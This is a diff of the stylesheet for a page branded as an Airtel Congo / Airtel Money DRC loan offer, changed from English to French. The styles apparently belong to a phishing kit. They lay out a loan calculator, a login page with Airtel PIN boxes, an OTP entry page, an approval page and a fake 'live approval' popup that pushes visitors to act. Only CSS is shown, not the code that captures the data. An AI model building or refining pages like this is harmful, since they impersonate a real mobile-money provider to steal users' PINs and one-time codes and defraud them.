@@ -1,1008 +1,1120 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Airtel Congo – Quick & Easy Loans</title>
-<link href="https://fonts.googleapis.com/css2?family=Times+New+Roman&display=swap" rel="stylesheet">
+<title>Airtel Money DRC – Crédit & Prets Rapides</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    --airtel-red: #ED1C24;
-    --airtel-red-dark: #C41219;
-    --airtel-black: #1C2340;
-    --grad: linear-gradient(135deg, #ED1C24 0%, #FF4D4D 100%);
-    --page-bg: #F4F5F7;
-    --white: #FFFFFF;
-    --text-dark: #1C2340;
-    --text-mid: #444;
-    --text-light: #888;
-    --border: #E5E7EB;
-    --radius: 12px;
-    --radius-sm: 8px;
+    --brand-red: #e21818;
+    --brand-red-dark: #b80c0c;
+    --brand-red-light: #fff0f0;
+    --brand-red-soft: #fde8e8;
+    --page-bg: #e21818;
+    --card-bg: #ffffff;
+    --text-main: #1f2937;
+    --text-muted: #6b7280;
+    --text-red: #e21818;
+    --border-color: #e5e7eb;
+    --radius-lg: 28px;
+    --radius-md: 16px;
+    --radius-sm: 12px;
+    --radius-pill: 50px;
+    --shadow-card: 0 12px 32px rgba(0, 0, 0, 0.12);
+    --shadow-btn: 0 8px 20px rgba(226, 24, 24, 0.35);
   }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: "Times New Roman", Times, serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }
 
-  /* PAGE SYSTEM */
-  .page { display: none; min-height: 100vh; animation: fadeIn 0.3s ease; }
-  .page.active { display: flex; flex-direction: column; }
-  @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+  }
 
-  /* OVERLAY */
-  .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); backdrop-filter:blur(3px); z-index:999; align-items:center; justify-content:center; }
-  .overlay.show { display:flex; }
-  .modal { background:var(--white); border-radius:var(--radius); padding:40px 36px; text-align:center; max-width:320px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.2); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
-  @keyframes popIn { from{opacity:0;transform:scale(0.85)} to{opacity:1;transform:scale(1)} }
-  .spinner { width:44px; height:44px; border:4px solid #eee; border-top-color:var(--airtel-red); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 18px; }
-  @keyframes spin { to{transform:rotate(360deg)} }
-  .modal h3 { font-size:1.1rem; font-weight:600; color:var(--text-dark); margin-bottom:6px; }
-  .modal p  { font-size:0.88rem; color:var(--text-light); }
-
-  /* PROFESSIONAL HEADER BRANDING & LOGO */
-  .brand-header { display: flex; align-items: center; justify-content: space-between; padding: 12px 28px; background: var(--white); border-bottom: 1px solid var(--border); width: 100%; }
-  .brand-logo-area { display: flex; align-items: center; gap: 12px; }
-  .brand-logo-mark { width: 40px; height: 40px; background: var(--grad); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--white); font-size: 1.3rem; font-weight: bold; box-shadow: 0 3px 10px rgba(237,28,36,0.25); }
-  .brand-text-group { display: flex; flex-direction: column; }
-  .brand-title { font-size: 1.15rem; font-weight: bold; color: var(--airtel-red); letter-spacing: -0.01em; line-height: 1.2; }
-  .brand-subtitle { font-size: 0.75rem; color: var(--text-light); text-transform: uppercase; letter-spacing: 0.05em; }
-  
-  .header-right-group { display: flex; align-items: center; gap: 16px; }
-  .brand-nav-right { font-size: 0.85rem; color: var(--text-mid); font-weight: 600; cursor: pointer; }
-
-  /* PROFESSIONAL LANGUAGE SELECTOR DROPDOWN STYLING */
-  .lang-selector-wrap { position: relative; display: inline-block; }
-  .lang-select-btn { background: #fafafa; border: 1px solid var(--border); border-radius: 6px; padding: 6px 10px; font-size: 0.82rem; font-weight: 600; color: var(--text-dark); cursor: pointer; display: flex; align-items: center; gap: 6px; font-family: "Times New Roman", Times, serif; transition: border-color 0.2s; }
-  .lang-select-btn:hover { border-color: var(--airtel-red); }
-  .lang-dropdown-menu { display: none; position: absolute; right: 0; top: calc(100% + 4px); background: #ffffff; border: 1px solid var(--border); border-radius: 6px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 150px; z-index: 1000; overflow: hidden; }
-  .lang-dropdown-menu.show { display: block; }
-  .lang-option { padding: 8px 12px; font-size: 0.82rem; color: var(--text-dark); cursor: pointer; display: flex; align-items: center; gap: 8px; transition: background 0.15s; text-align: left; border: none; background: none; width: 100%; font-family: "Times New Roman", Times, serif; }
-  .lang-option:hover { background: #fdf2f2; color: var(--airtel-red); }
-  .lang-option.active { font-weight: bold; color: var(--airtel-red); background: #fafafa; }
-
-  /* NAV */
-  .navbar { background:var(--airtel-red); display:flex; align-items:center; justify-content:center; padding:0 20px; height:54px; position:relative; flex-shrink:0; }
-  .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.8); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; }
-  .nav-left:hover { color:#fff; }
-  .nav-right { position:absolute; right:20px; display:flex; flex-direction:column; gap:4px; cursor:pointer; padding:4px; }
-  .hline { width:20px; height:2px; background:rgba(255,255,255,0.8); border-radius:1px; }
-
-  /* BUTTONS */
-  .btn-grad { background:var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; width:100%; font-family:"Times New Roman", Times, serif; transition:opacity 0.2s, box-shadow 0.2s; box-shadow:0 4px 12px rgba(237,28,36,0.25); }
-  .btn-grad:hover { opacity:0.95; box-shadow:0 6px 16px rgba(237,28,36,0.35); }
-  .btn-grad:disabled { opacity:0.5; cursor:not-allowed; box-shadow:none; }
-  .btn-gray { background:#e0e0e0; color:#666; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; flex:1; font-family:"Times New Roman", Times, serif; transition:background 0.2s; }
-  .btn-gray:hover { background:#d0d0d0; }
-
-  /* FORM */
-  .field { margin-bottom:18px; }
-  .field label { display:block; font-size:0.82rem; font-weight:500; color:var(--text-mid); margin-bottom:6px; }
-  .field input, .field select, .field textarea { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:"Times New Roman", Times, serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s, box-shadow 0.2s; appearance:none; -webkit-appearance:none; }
-  .field input:focus, .field select:focus, .field textarea:focus { border-color:var(--airtel-red); box-shadow:0 0 0 3px rgba(237,28,36,0.12); }
-  .field textarea { resize:vertical; min-height:90px; }
-  .sel-wrap { position:relative; }
-  .sel-wrap::after { content:'▾'; position:absolute; right:14px; top:50%; transform:translateY(-50%); color:var(--text-light); pointer-events:none; font-size:0.9rem; }
-  .field-row { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
-  .phone-row { display:flex; }
-  .ph-pre { padding:11px 12px; background:#f5f5f5; border:1.5px solid var(--border); border-right:none; border-radius:var(--radius-sm) 0 0 var(--radius-sm); font-size:0.85rem; font-weight:500; color:#555; white-space:nowrap; display:flex; align-items:center; }
-  .phone-row input { border-radius:0 var(--radius-sm) var(--radius-sm) 0 !important; flex:1; }
-  .field-hint { font-size:0.75rem; color:var(--text-light); margin-top:5px; }
-
-  /* STEP PROGRESS */
-  .prog-row { display:flex; gap:8px; margin:10px 0 24px; }
-  .prog-seg { flex:1; height:4px; border-radius:2px; background:#e0e0e0; transition:background 0.3s; }
-  .prog-seg.done { background:var(--airtel-black); }
-  .prog-seg.now  { background:var(--airtel-red); }
-
-  /* STEP BUTTONS */
-  .step-btns { display:flex; gap:12px; margin-top:8px; }
-  .step-btns .btn-grad { flex:1; }
-
-  /* FOOTER */
-  .pg-footer { margin-top:auto; padding:14px; text-align:center; font-size:0.78rem; color:var(--text-light); background:#fff; border-top:1px solid #eee; flex-shrink:0; }
-
-  /* ───── PAGE 1: LANDING ───── */
-  #page-landing { background:var(--page-bg); }
-  .land-center { flex:1; display:flex; align-items:center; justify-content:center; padding:32px 16px; }
-  .land-card { width:100%; max-width:520px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.06); padding:36px 32px; border-top:4px solid var(--airtel-red); }
-  .land-card h1 { font-size:1.45rem; font-weight:700; text-align:center; margin-bottom:6px; }
-  .land-tagline { text-align:center; font-size:0.84rem; color:var(--text-light); margin-bottom:28px; }
-  .calc-box { background:#fafafa; border:1px solid #eee; border-radius:var(--radius-sm); padding:20px; margin-bottom:22px; }
-  .calc-box h2 { font-size:0.92rem; font-weight:600; margin-bottom:16px; }
-  .calc-row2 { display:flex; justify-content:space-between; font-size:0.81rem; color:var(--text-mid); margin-bottom:6px; }
-  .calc-row2 .cv { color:var(--airtel-red); font-weight:600; }
-  input[type=range] { width:100%; -webkit-appearance:none; height:5px; border-radius:3px; outline:none; cursor:pointer; margin-bottom:4px; background:linear-gradient(to right,var(--airtel-red) 0%,var(--airtel-red) var(--pct,10%),#ddd var(--pct,10%),#ddd 100%); }
-  input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:18px; height:18px; border-radius:50%; background:var(--airtel-red); border:3px solid #fff; box-shadow:0 2px 6px rgba(237,28,36,0.4); cursor:pointer; }
-  .range-ends { display:flex; justify-content:space-between; font-size:0.72rem; color:var(--text-light); margin-bottom:14px; }
-  .monthly-box { background:#fff; border:1px solid #eee; border-radius:var(--radius-sm); padding:14px 16px; display:flex; justify-content:space-between; align-items:center; }
-  .monthly-box .ml { font-size:0.82rem; color:var(--text-light); }
-  .monthly-box .ma { font-size:1.5rem; font-weight:700; color:var(--airtel-red); }
-  .feats-row { display:flex; justify-content:space-around; padding:20px 0 0; border-top:1px solid #f0f0f0; margin-top:4px; }
-  .feat { text-align:center; }
-  .feat .fi { font-size:1.6rem; margin-bottom:5px; }
-  .feat .ft { font-size:0.8rem; font-weight:600; }
-  .feat .fs { font-size:0.73rem; color:var(--text-light); }
-  .land-footer { background:var(--airtel-black); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.6); flex-shrink:0; }
-  
-  /* ───── AIRTEL CONGO LIVE APPROVAL CARD ───── */
-.live-popup{
-    position: absolute;
-    top: 75px;
-    left: 50%;
-    transform: translateX(-50%);
-    width: 90%;
-    max-width: 360px;
-    background: #ffffff;
-    border-radius: 8px;
-    padding: 10px 14px;
+  body {
+    background-color: var(--page-bg);
+    color: var(--text-main);
+    min-height: 100vh;
+    overflow-x: hidden;
     display: flex;
+    justify-content: center;
+  }
+
+  /* SYSTEM CONTAINER & WRAPPER */
+  .app-viewport {
+    width: 100%;
+    max-width: 440px;
+    min-height: 100vh;
+    background: var(--page-bg);
+    display: flex;
+    flex-direction: column;
+    position: relative;
+  }
+
+  /* PAGE ISOLATION & FLOW SYSTEM */
+  .page { 
+    display: none !important; 
+    min-height: 100vh; 
+    width: 100%;
+    flex-direction: column;
+    justify-content: space-between;
+    animation: fadeIn 0.25s ease-out; 
+    padding: 16px 16px 24px 16px;
+  }
+  .page.active { 
+    display: flex !important; 
+  }
+  @keyframes fadeIn { 
+    from { opacity: 0; transform: translateY(6px); } 
+    to { opacity: 1; transform: translateY(0); } 
+  }
+
+  /* WELCOME MODAL PAGE SPECIFIC STYLES */
+  #page-welcome {
+    justify-content: center;
     align-items: center;
-    gap: 12px;
-    border: 1px solid rgba(230, 0, 0, 0.15);
-    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.12);
-    opacity: 0;
-    visibility: hidden;
-    transition: all 0.35s ease;
-    z-index: 9999;
-}
-
-.live-popup.show{
-    opacity: 1;
-    visibility: visible;
-    transform: translateX(-50%);
-}
-
-.popup-avatar{
-    width: 38px;
-    height: 38px;
-    min-width: 38px;
+    padding: 24px;
+  }
+  .welcome-card {
+    background: #ffffff;
+    border-radius: var(--radius-lg);
+    padding: 40px 24px;
+    text-align: center;
+    box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  .welcome-icon-wrap {
+    width: 80px;
+    height: 80px;
+    background: var(--brand-red);
     border-radius: 50%;
-    background: linear-gradient(135deg, #e60000, #ff1a1a);
-    color: #ffffff;
     display: flex;
     align-items: center;
     justify-content: center;
-    font-size: 0.95rem;
+    margin-bottom: 28px;
+    box-shadow: 0 8px 20px rgba(226, 24, 24, 0.3);
+  }
+  .welcome-icon-wrap svg {
+    width: 44px;
+    height: 44px;
+    fill: #ffffff;
+  }
+  .welcome-text {
+    color: var(--brand-red);
+    font-size: 1.1rem;
     font-weight: 700;
-    box-shadow: 0 2px 6px rgba(230, 0, 0, 0.3);
-}
+    line-height: 1.6;
+    margin-bottom: 32px;
+    max-width: 320px;
+  }
+  .welcome-text strong {
+    font-weight: 800;
+  }
+  .welcome-btn {
+    background: var(--brand-red);
+    color: #ffffff;
+    border: none;
+    border-radius: var(--radius-pill);
+    padding: 16px 48px;
+    font-size: 1.05rem;
+    font-weight: 800;
+    letter-spacing: 0.04em;
+    cursor: pointer;
+    box-shadow: var(--shadow-btn);
+    transition: transform 0.15s ease, background-color 0.2s ease;
+    width: 100%;
+    max-width: 240px;
+  }
+  .welcome-btn:active {
+    transform: scale(0.97);
+  }
 
-.popup-content{
-    flex: 1;
-}
+  /* OVERLAY & MODALS */
+  .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.65); backdrop-filter:blur(4px); z-index:999; align-items:center; justify-content:center; padding:20px; }
+  .overlay.show { display:flex; }
+  .modal { background:var(--card-bg); border-radius:var(--radius-md); padding:32px 24px; text-align:center; max-width:320px; width:100%; box-shadow:0 20px 40px rgba(0,0,0,0.25); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
+  @keyframes popIn { from{opacity:0;transform:scale(0.88)} to{opacity:1;transform:scale(1)} }
+  .spinner { width:40px; height:40px; border:3.5px solid var(--brand-red-soft); border-top-color:var(--brand-red); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 16px; }
+  @keyframes spin { to{transform:rotate(360deg)} }
+  .modal h3 { font-size:1.1rem; font-weight:700; color:var(--text-main); margin-bottom:6px; }
+  .modal p { font-size:0.85rem; color:var(--text-muted); }
 
-.popup-text{
-    font-size: 0.78rem;
-    line-height: 1.35;
-    color: #4b5563;
-}
-
-.popup-text strong{
-    color: #111827;
-    font-weight: 700;
-}
-
-.popup-time{
-    margin-top: 3px;
-    font-size: 0.65rem;
-    color: #e60000;
+  /* BRAND LOGO COMPONENT */
+  .brand-header {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px 0 16px 0;
+  }
+  .brand-icon-wrap {
+    width: 60px;
+    height: 60px;
+    background: #ffffff;
+    border-radius: 18px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 4px 14px rgba(0,0,0,0.1);
+    margin-bottom: 12px;
+  }
+  .brand-icon-wrap svg {
+    width: 38px;
+    height: 38px;
+    fill: var(--brand-red);
+  }
+  .brand-title {
+    color: #ffffff;
+    font-size: 2rem;
+    font-weight: 800;
+    letter-spacing: -0.02em;
+    line-height: 1;
+    margin-bottom: 6px;
+  }
+  .brand-subtitle {
+    color: rgba(255, 255, 255, 0.95);
+    font-size: 0.85rem;
     font-weight: 600;
-}
+    text-align: center;
+  }
 
-.popup-time::before{
-    content: "● ";
-    animation: pulse 1.2s infinite;
-}
+  /* PILL BADGES */
+  .pill-group {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    margin: 14px 0 20px 0;
+    width: 100%;
+  }
+  .pill-badge {
+    background: #ffffff;
+    color: var(--brand-red);
+    padding: 8px 14px;
+    border-radius: var(--radius-pill);
+    font-size: 0.75rem;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.06);
+  }
 
-@keyframes pulse{
-    50%{ opacity: .4; }
-}
+  /* NAVIGATION BAR */
+  .navbar { 
+    background: transparent; 
+    display: flex; 
+    align-items: center; 
+    justify-content: space-between; 
+    padding: 8px 0 16px 0; 
+    width: 100%;
+  }
+  .nav-left { 
+    color: #ffffff; 
+    font-size: 0.88rem; 
+    font-weight: 600; 
+    cursor: pointer; 
+    text-decoration: none; 
+    display: flex;
+    align-items: center;
+    gap: 4px;
+  }
+  .nav-right { 
+    display: flex; 
+    flex-direction: column; 
+    gap: 4px; 
+    cursor: pointer; 
+    padding: 4px; 
+  }
+  .hline { width: 20px; height: 2px; background: #ffffff; border-radius: 2px; }
 
-@media (max-width: 480px){
-    .live-popup{
-        top: 70px;
-        max-width: 330px;
-        padding: 9px 12px;
-    }
-    .popup-avatar{
-        width: 34px;
-        height: 34px;
-        min-width: 34px;
-        font-size: 0.85rem;
-    }
-    .popup-text{
-        font-size: 0.74rem;
-    }
-    .popup-time{
-        font-size: 0.62rem;
-    }
-}
+  /* BUTTONS */
+  .btn-grad { 
+    background: var(--brand-red); 
+    color: #ffffff; 
+    border: none; 
+    border-radius: var(--radius-md); 
+    padding: 16px 24px; 
+    font-size: 1rem; 
+    font-weight: 800; 
+    letter-spacing: 0.02em; 
+    cursor: pointer; 
+    width: 100%; 
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    box-shadow: var(--shadow-btn);
+    transition: transform 0.15s ease, background-color 0.2s ease;
+  }
+  .btn-grad:active { transform: scale(0.98); }
+  .btn-grad:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
 
+  .btn-gray { 
+    background: #f3f4f6; 
+    color: var(--text-muted); 
+    border: none; 
+    border-radius: var(--radius-md); 
+    padding: 16px 20px; 
+    font-size: 0.9rem; 
+    font-weight: 700; 
+    cursor: pointer; 
+    flex: 1; 
+    transition: background 0.2s; 
+  }
 
-  /* ───── STEP PAGES 2-4 ───── */
-  .step-center { flex:1; display:flex; align-items:flex-start; justify-content:center; padding:28px 16px; }
-  .step-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.06); padding:32px 28px; border-top:4px solid var(--airtel-red); }
-  .step-card h2 { font-size:1.25rem; font-weight:700; text-align:center; margin-bottom:4px; }
-  .step-sub { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:4px; }
+  /* FORMS & INPUTS */
+  .field { margin-bottom: 18px; }
+  .field label { display: block; font-size: 0.82rem; font-weight: 700; color: var(--brand-red); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.03em; }
+  .field input, .field select, .field textarea { 
+    width: 100%; 
+    padding: 14px 16px; 
+    border: 1.5px solid var(--border-color); 
+    border-radius: var(--radius-sm); 
+    font-size: 0.95rem; 
+    font-weight: 600;
+    color: var(--text-main); 
+    background: #fafafa; 
+    outline: none; 
+    transition: all 0.2s; 
+    appearance: none; 
+    -webkit-appearance: none; 
+  }
+  .field input:focus, .field select:focus, .field textarea:focus { 
+    border-color: var(--brand-red); 
+    background: #ffffff;
+    box-shadow: 0 0 0 3px rgba(226, 24, 24, 0.12); 
+  }
+  .field textarea { resize: vertical; min-height: 90px; }
+  .sel-wrap { position: relative; }
+  .sel-wrap::after { content: '▾'; position: absolute; right: 16px; top: 50%; transform: translateY(-50%); color: var(--text-muted); pointer-events: none; font-size: 1rem; }
+  .field-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  .phone-row { display: flex; }
+  .ph-pre { 
+    padding: 14px 14px; 
+    background: #f3f4f6; 
+    border: 1.5px solid var(--border-color); 
+    border-right: none; 
+    border-radius: var(--radius-sm) 0 0 var(--radius-sm); 
+    font-size: 0.9rem; 
+    font-weight: 700; 
+    color: var(--text-main); 
+    display: flex; 
+    align-items: center; 
+    gap: 6px;
+  }
+  .phone-row input { border-radius: 0 var(--radius-sm) var(--radius-sm) 0 !important; flex: 1; }
+  .field-hint { font-size: 0.75rem; color: var(--text-muted); margin-top: 6px; font-weight: 500; }
 
-  /* SUMMARY */
-  .sum-box { border:1px solid #e0e0e0; border-left:4px solid var(--airtel-red); border-radius:var(--radius-sm); padding:16px 14px; margin:16px 0; background:#fff5f5; }
-  .sum-box h3 { font-size:0.88rem; font-weight:600; margin-bottom:12px; }
-  .sum-row { display:flex; justify-content:space-between; font-size:0.82rem; padding:7px 0; border-bottom:1px solid #f0f0f0; }
-  .sum-row:last-child { border-bottom:none; }
-  .sum-row .sk { color:var(--text-light); }
-  .sum-row .sv { font-weight:500; }
+  /* STEP PROGRESS */
+  .prog-row { display: flex; gap: 8px; margin: 12px 0 24px; }
+  .prog-seg { flex: 1; height: 6px; border-radius: 3px; background: #f3f4f6; transition: background 0.3s; }
+  .prog-seg.done { background: var(--brand-red); }
+  .prog-seg.now { background: var(--brand-red); }
 
-  /* ───── PAGE 5: SUBMITTED ───── */
-  #page-submitted { background:var(--airtel-red); align-items:center; justify-content:center; }
-  .sub-wrap { text-align:center; padding:40px 24px; max-width:420px; }
-  .sub-icon { width:80px; height:80px; border-radius:50%; background:rgba(255,255,255,0.15); border:2px solid rgba(255,255,255,0.4); display:flex; align-items:center; justify-content:center; font-size:2rem; margin:0 auto 24px; animation:pulse 2s ease infinite; color:#fff; }
-  @keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(255,255,255,0.4)} 50%{box-shadow:0 0 0 16px rgba(255,255,255,0)} }
-  .sub-wrap h2 { font-size:1.6rem; font-weight:700; color:#fff; margin-bottom:12px; }
-  .sub-wrap p  { color:rgba(255,255,255,0.85); font-size:0.88rem; line-height:1.7; margin-bottom:24px; }
-  .redir-pill { display:inline-flex; align-items:center; gap:8px; background:rgba(255,255,255,0.15); border:1px solid rgba(255,255,255,0.3); border-radius:50px; padding:9px 20px; color:#fff; font-size:0.84rem; margin-bottom:24px; }
-  .redir-n { font-weight:700; color:#fff; background:rgba(0,0,0,0.2); padding:2px 8px; border-radius:10px; }
-  .btn-go { background:#fff; color:var(--airtel-red); border:none; border-radius:8px; padding:14px 36px; font-size:0.9rem; font-weight:600; cursor:pointer; font-family:"Times New Roman", Times, serif; letter-spacing:0.04em; transition:background 0.2s; }
-  .btn-go:hover { background:#f8f9fa; }
+  /* STEP BUTTONS */
+  .step-btns { display: flex; gap: 12px; margin-top: 12px; }
+  .step-btns .btn-grad { flex: 1.5; }
 
-  /* ───── PAGE 6: LOGIN ───── */
-  #page-login { background:#fff; }
-  .login-body-wrap { flex:1; background:#fff; padding:32px 20px 0; display:flex; flex-direction:column; align-items:center; }
-  .login-body-wrap h2 { font-size:1.05rem; font-weight:600; margin-bottom:24px; }
-  .login-inner { width:100%; max-width:380px; }
-  .lg-phone-row { display:flex; margin-bottom:24px; }
-  .lg-ph-pre { display:flex; align-items:center; gap:4px; padding:11px 12px; background:#fafafa; border:1.5px solid var(--border); border-right:none; border-radius:var(--radius-sm) 0 0 var(--radius-sm); font-size:0.84rem; color:#555; font-weight:500; white-space:nowrap; }
-  .lg-phone-row input { flex:1; padding:11px 14px; border:1.5px solid var(--border); border-left:none; border-radius:0 var(--radius-sm) var(--radius-sm) 0; font-family:"Times New Roman", Times, serif; font-size:0.9rem; outline:none; background:#fff; transition:border-color 0.2s; }
-  .lg-phone-row input:focus { border-color:var(--airtel-red); }
-  .pin-label { font-size:0.82rem; color:var(--text-light); text-align:center; margin-bottom:12px; }
-  .pin-row { display:flex; gap:10px; justify-content:center; margin-bottom:12px; position:relative; align-items:center; }
-  .pin-box { width:52px; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:"Times New Roman", Times, serif; font-size:1.3rem; font-weight:700; color:var(--airtel-red); outline:none; transition:border-color 0.2s; }
-  .pin-box:focus { border-color:var(--airtel-red); box-shadow:0 0 0 3px rgba(237,28,36,0.12); }
-  .pin-eye { cursor:pointer; color:var(--text-light); font-size:1rem; background:none; border:none; margin-left:6px; }
-  .forgot-pin { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:24px; cursor:pointer; }
-  .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:"Times New Roman", Times, serif; transition:all 0.2s; }
-  .btn-login.rdy { background:var(--grad); color:#fff; box-shadow:0 4px 12px rgba(237,28,36,0.25); }
-  .lg-curve { margin-top:32px; background:#fff; overflow:hidden; flex-shrink:0; }
-  .lg-curve::before { content:''; display:block; background:var(--airtel-black); height:55px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
-  .lg-foot { background:var(--airtel-black); padding:24px 20px 32px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center; color:#fff; }
-  .lg-version { font-size:0.72rem; color:rgba(255,255,255,0.5); margin-top:4px; }
-  .lg-terms { font-size:0.72rem; color:rgba(255,255,255,0.6); }
-  .lg-terms a { color:#fff; text-decoration:underline; }
+  /* MAIN CARD LAYOUT */
+  .main-card {
+    background: var(--card-bg);
+    border-radius: var(--radius-lg);
+    padding: 24px 20px;
+    box-shadow: var(--shadow-card);
+    width: 100%;
+    margin-bottom: 16px;
+  }
+  .card-header-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 20px;
+  }
+  .card-title-group {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    color: var(--brand-red);
+    font-size: 0.85rem;
+    font-weight: 800;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+  }
+  .tag-badge {
+    background: var(--brand-red-light);
+    color: var(--brand-red);
+    font-size: 0.75rem;
+    font-weight: 700;
+    padding: 6px 12px;
+    border-radius: var(--radius-pill);
+  }
 
-  /* ───── PAGE 7: OTP ───── */
-  #page-otp { background:#fff; }
-  .otp-body-wrap { flex:1; padding:32px 16px; display:flex; align-items:flex-start; justify-content:center; }
-  .otp-card { background:#fff; border:1px solid #eee; border-radius:var(--radius); padding:32px 28px; width:100%; max-width:440px; box-shadow:0 2px 16px rgba(0,0,0,0.06); border-top:4px solid var(--airtel-red); }
-  .otp-card h2 { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
-  .otp-hint { font-size:0.83rem; color:var(--text-light); margin-bottom:5px; }
-  .otp-phone { font-size:0.9rem; font-weight:600; color:var(--text-dark); margin-bottom:22px; }
-  .otp-inputs { display:flex; gap:8px; margin-bottom:12px; width:100%; }
-  .otp-box { flex:1; min-width:0; width:0; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:"Times New Roman", Times, serif; font-size:1.2rem; font-weight:700; color:var(--airtel-red); outline:none; transition:border-color 0.2s; }
-  .otp-box:focus { border-color:var(--airtel-red); box-shadow:0 0 0 3px rgba(237,28,36,0.12); }
-  .otp-resend { font-size:0.8rem; color:var(--airtel-red); margin-bottom:22px; }
-  .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:"Times New Roman", Times, serif; transition:all 0.2s; }
-  .btn-otp.rdy { background:var(--grad); color:#fff; box-shadow:0 4px 12px rgba(237,28,36,0.25); }
-  .otp-curve { background:#fff; overflow:hidden; flex-shrink:0; }
-  .otp-curve::before { content:''; display:block; background:var(--airtel-black); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
-  .otp-foot { background:var(--airtel-black); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.6); }
+  /* CALCULATOR SPECIFIC STYLES */
+  .calc-input-block {
+    margin-bottom: 20px;
+  }
+  .calc-label-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 10px;
+  }
+  .calc-label {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    color: var(--brand-red);
+    font-size: 0.95rem;
+    font-weight: 800;
+  }
+  .calc-value-pill {
+    background: var(--brand-red-light);
+    color: var(--brand-red);
+    font-size: 1.05rem;
+    font-weight: 800;
+    padding: 6px 16px;
+    border-radius: var(--radius-pill);
+  }
 
-  /* ───── PAGE 8: APPROVAL ───── */
-  #page-approval { background:linear-gradient(135deg,#ED1C24 0%,#C41219 50%,#1C2340 100%); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
-  .appr-wrap { width:100%; max-width:520px; }
-  .appr-top { background:#fff; border-radius:var(--radius) var(--radius) 0 0; padding:28px 24px 0; text-align:center; }
-  .check-circle { width:56px; height:56px; border-radius:50%; background:var(--grad); display:flex; align-items:center; justify-content:center; margin:0 auto 12px; font-size:1.3rem; color:#fff; box-shadow:0 4px 16px rgba(237,28,36,0.4); }
-  .appr-title { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
-  .appr-sub   { font-size:0.82rem; color:var(--text-light); margin-bottom:18px; }
-  .appr-banner { background:var(--grad); padding:16px; margin:0 -24px; text-align:center; }
-  .appr-banner .abl { font-size:0.72rem; color:rgba(255,255,255,0.9); text-transform:uppercase; letter-spacing:0.06em; }
-  .appr-banner .aba { font-size:2rem; font-weight:700; color:#fff; }
-  .comp-box { background:#FFFBEA; border:1px solid #F5C842; padding:14px 16px; }
-  .comp-box .ch { display:flex; align-items:center; gap:6px; font-size:0.82rem; font-weight:700; color:#a07000; margin-bottom:6px; }
-  .comp-box p { font-size:0.78rem; color:#7a5500; line-height:1.6; }
-  .comp-box strong { font-weight:600; }
